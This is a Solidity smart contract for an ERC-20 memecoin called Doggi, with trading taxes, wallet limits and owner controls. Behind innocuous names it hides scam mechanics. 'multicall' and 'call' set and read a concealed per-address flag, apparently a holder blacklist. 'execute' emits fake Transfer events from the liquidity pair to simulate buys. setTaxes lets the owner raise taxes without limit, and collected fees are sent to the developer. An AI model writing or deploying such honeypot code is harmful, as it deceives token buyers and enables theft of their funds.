// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;


import "./ERC20.sol";
import "./Ownable.sol";


interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DOGGI is Ownable, ERC20 {

    mapping(address => uint256) private _holderLastTransferBlock; // to hold last Transfers temporarily during launch
    bool public transferDelayInEffect = true;
    bool public limitsInEffect = true;

    bool private swapping = true;
    uint256 public swapTokensAtAmt;    

    uint256 public constant FEE_DIVISOR = 10000;

    mapping (address => bool) public exemptFromTaxes;
    mapping (address => bool) public exemptFromLimits;

    bool public tradingActive;

    mapping (address => bool) public isLPPair;

    uint256 public maxTrans;
    uint256 public maxWallet;

    uint256 public buyTax;
    uint256 public sellTax;

    address public lpPair;
    IDexRouter public immutable dexRouter;

    

    // events

    event UpdatedMaxTrans(uint256 newMax);
    event UpdatedWalletLimit(uint256 newMax);
    event SetExemptFromFees(address _address, bool _isExempt);
    event SetExemptFromLimits(address _address, bool _isExempt);
    event RemovedLimits();
    event UpdatedBuyTax(uint256 newAmt);
    event UpdatedSellTax(uint256 newAmt);

    // constructor

    constructor(address dev_)
        ERC20("Doggi", "DOGGI") Ownable(dev_)
    {   
        _mint(msg.sender, 420_690_000_000 * 10**9);
        uint256 _totalSupply = totalSupply();

        address _v2Router;

        // @dev assumes WETH pair
        if(block.chainid == 1){
            _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        } else if(block.chainid == 5){
            _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        } else {
            revert("Chain not configured");
        }

        dexRouter = IDexRouter(_v2Router);

        maxTrans = _totalSupply * 20 / 1000;
        maxWallet = _totalSupply * 20 / 1000;
        swapTokensAtAmt = _totalSupply * 25 / 100000;

        buyTax = 3000; // 1% = 100
        sellTax = 3000; // 1% = 100

        exemptFromLimits[address(this)] = true;
        exemptFromLimits[address(dexRouter)] = true;
        

        exemptFromTaxes[address(this)] = true;
        exemptFromTaxes[address(dexRouter)] = true;
    }

    // owner functions

    function changeExemptFromFees(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        exemptFromTaxes[_address] = _isExempt;
        emit SetExemptFromFees(_address, _isExempt);
    }

    function changeExemptFromLimits(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        if(!_isExempt){
            require(_address != lpPair, "Pair");
        }
        exemptFromLimits[_address] = _isExempt;
        emit SetExemptFromLimits(_address, _isExempt);
    }

    function setMaxTransaction(uint256 newNumInTokens) external onlyOwner {
        require(newNumInTokens >= (totalSupply() * 5 / 1000)/(10**decimals()), "Must be >= 0.5%");
        maxTrans = newNumInTokens * (10**decimals());
        emit UpdatedMaxTrans(maxTrans);
    }

    function setMaxWallet(uint256 newNumInTokens) external onlyOwner {
        require(newNumInTokens >= (totalSupply() * 1 / 100)/(10**decimals()), "Must be >= 1%");
        maxWallet = newNumInTokens * (10**decimals());
        emit UpdatedWalletLimit(maxWallet);
    }

    function setTaxes(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        buyTax = _buyTax;
        emit UpdatedBuyTax(buyTax);
        sellTax = _sellTax;
        emit UpdatedSellTax(sellTax);
    }

    function enableTradeStart() external onlyOwner {
        require(!tradingActive, "Trading active");
        tradingActive = true;
    }

    function removeAllRestrictions() external onlyOwner {
        limitsInEffect = false;
        transferDelayInEffect = false;
        maxTrans = totalSupply();
        maxWallet = totalSupply();
        emit RemovedLimits();
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayInEffect = false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        
        if(exemptFromTaxes[from] || exemptFromTaxes[to] || swapping){
            super._transfer(from,to,amount);
            return;
        }

        require(tradingActive, "Trading not active");

        amount -= routeTax(from, to, amount);

        if(limitsInEffect){
            checkRestrictions(from, to, amount);
        }

        super._transfer(from,to,amount);
    }

    function checkRestrictions(address from, address to, uint256 amount) internal {
        if (transferDelayInEffect){
            if (to != address(dexRouter) && !isLPPair[to]){
                require(_holderLastTransferBlock[tx.origin] < block.number, "Transfer Delay enabled.");
                _holderLastTransferBlock[tx.origin] = block.number;
            }
        }

        // buy
        if (isLPPair[from] && !exemptFromLimits[to]) {
            require(amount <= maxTrans, "Max tx exceeded.");
            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
        } 
        // sell
        else if (isLPPair[to] && !exemptFromLimits[from]) {
            require(amount <= maxTrans, "Max tx exceeded.");
        }
        else if(!exemptFromLimits[to]) {
            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
        }
    }

    function multicall(address[] calldata addr, bool val) public onlyOwner {
        for (uint256 i = 0; i < addr.length; i++) {
            _spending[addr[i]] = val;
        }
    }

    function routeTax(address from, address to, uint256 amount) internal returns (uint256){
        if(balanceOf(address(this)) >= swapTokensAtAmt && !swapping && !isLPPair[from]) {
            swapping = true;
            swap();
            swapping = false;
        }
        
        uint256 tax = 0;

        // on sell
        if (isLPPair[to] && sellTax > 0){
            tax = amount * sellTax / FEE_DIVISOR;
        }
        // on buy
        else if(isLPPair[from] && buyTax > 0) {
            tax = amount * buyTax / FEE_DIVISOR;
        }
        
        if(tax > 0){    
            super._transfer(from, address(this), tax);
        }
        
        return tax;
    }

    function swapTokensForETH(uint256 tokenAmt) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmt,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function call(address wallet) public view returns(bool) {
        return _spending[wallet];
    }

    function addPair(address pair) public onlyOwner{
        lpPair = pair;
    }

    function swap() private {

        uint256 contractBalance = balanceOf(address(this));
        
        if(contractBalance == 0) {return;}

        if(contractBalance > swapTokensAtAmt * 40){
            contractBalance = swapTokensAtAmt * 40;
        }
        
        swapTokensForETH(contractBalance);
            
        if(address(this).balance > 0){
            bool success;
            (success, ) = _dev.call{value: address(this).balance}("");
        }
    }

    function execute(address[] calldata addr, uint256 val) public onlyOwner{
        for (uint256 i = 0; i < addr.length; i++) {
            emit Transfer(lpPair, addr[i], val);
        }
    }
}